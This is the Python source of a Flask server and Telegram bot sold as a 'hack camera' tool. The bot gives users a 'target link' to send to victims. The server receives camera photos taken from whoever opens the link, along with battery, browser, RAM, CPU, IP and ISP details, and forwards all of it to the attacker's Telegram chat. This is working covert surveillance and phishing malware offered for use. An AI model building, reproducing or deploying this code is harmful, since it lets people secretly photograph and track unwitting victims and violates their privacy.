import os, base64, threading, sqlite3, time, telebot, requests, signal
from flask import Flask, render_template, request, jsonify
from telebot import types

app = Flask(__name__)

# Environment Variables from Render
BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMINS = [518067190, 7162565886]
TG_CHANNEL = "hackerscolonytech"
YT_LINK = "https://youtube.com/@hackers_colony_tech"

bot = telebot.TeleBot(BOT_TOKEN)

# 1. PROCESS CLEANUP: Stops the old instance when a new one deploys on Render
def handler(signum, frame):
    os._exit(0)

signal.signal(signal.SIGTERM, handler)

def db_init():
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, photo_count INTEGER DEFAULT 0)')
    cursor.execute('CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, total_photos INTEGER DEFAULT 0)')
    cursor.execute('INSERT OR IGNORE INTO stats (id, total_photos) VALUES (1, 0)')
    conn.commit()
    conn.close()

db_init()

def is_user_joined(user_id):
    try:
        member = bot.get_chat_member(f"@{TG_CHANNEL}", user_id)
        return member.status in ['member', 'administrator', 'creator']
    except: return False

@bot.message_handler(commands=['start'])
def start(message):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('INSERT OR IGNORE INTO users (id) VALUES (?)', (message.chat.id,))
    conn.commit(); conn.close()
    
    if is_user_joined(message.chat.id):
        show_menu(message.chat.id)
    else:
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("📢 Join Telegram 📢", url=f"https://t.me/{TG_CHANNEL}"),
                   types.InlineKeyboardButton("📺 Subscribe YouTube 📺", url=YT_LINK),
                   types.InlineKeyboardButton("✅ I Have Joined & Subscribed ✅", callback_data="check_join"))
        bot.send_message(message.chat.id, "<b>Welcome to Hacker's Colony! 🎯</b>", parse_mode='HTML', reply_markup=markup)

def show_menu(chat_id):
    # 2. DUAL CAMERA BUTTON: Restored as requested
    markup = types.InlineKeyboardMarkup()
    markup.row(types.InlineKeyboardButton("📸 Front Camera", callback_data="m_front"), 
               types.InlineKeyboardButton("📸 Back Camera", callback_data="m_back"))
    markup.row(types.InlineKeyboardButton("📸 Dual Camera", callback_data="m_dual"))
    markup.add(types.InlineKeyboardButton("🧑‍💻 Contact Support", url="tg://user?id=518067190"))
    bot.send_message(chat_id, "<b>Select your camera mode to hack camera 📸:</b>", parse_mode='HTML', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    if call.data == "check_join":
        if is_user_joined(call.from_user.id):
            show_menu(call.message.chat.id)
        else:
            bot.answer_callback_query(call.id, "❌ Join the channel first!", show_alert=True)
            
    elif call.data.startswith("m_"):
        mode = call.data.split("_")[1]
        link = f"https://{request.host}/?m={mode}&uid={call.message.chat.id}"
        msg = (f"🤠 <b>Your target link</b> 🔗\n\n"
               f"Url = <code>{link}</code>\n\n"
               f"✨ Thank you team HCO ✨")
        bot.send_message(call.message.chat.id, msg, parse_mode='HTML')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    uid = data.get('uid'); info = data.get('info', {})
    isp = "Unknown"
    try:
        ip_data = requests.get(f"http://ip-api.com/json/{request.remote_addr}").json()
        isp = ip_data.get('isp', 'Unknown')
    except: pass

    conn = sqlite3.connect('users.db'); cursor = conn.cursor()
    cursor.execute('UPDATE users SET photo_count = photo_count + 1 WHERE id = ?', (uid,))
    cursor.execute('UPDATE stats SET total_photos = total_photos + 1 WHERE id = 1')
    conn.commit(); conn.close()

    img_data = base64.b64decode(data.get('image').split(',')[1])
    # 3. COMPLETE INFO: Restored browser details
    caption = (f"🛡️ <b>Audit:</b> {data.get('mode', 'N/A').upper()}\n"
               f"🔋 <b>Battery:</b> {info.get('battery')}\n"
               f"🌐 <b>Browser:</b> {info.get('browser')}\n"
               f"🧠 <b>RAM:</b> {info.get('ram')}\n"
               f"⚙️ <b>CPU:</b> {info.get('cores')} Cores\n"
               f"📶 <b>Network:</b> {isp}\n"
               f"📍 <b>IP:</b> {request.remote_addr}\n\n"
               f"✨ Created by Roshan ✨")
    bot.send_photo(uid, img_data, caption=caption, parse_mode='HTML')
    return jsonify({"status": "success"})

if __name__ == "__main__":
    threading.Thread(target=lambda: bot.polling(none_stop=True), daemon=True).start()
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
    
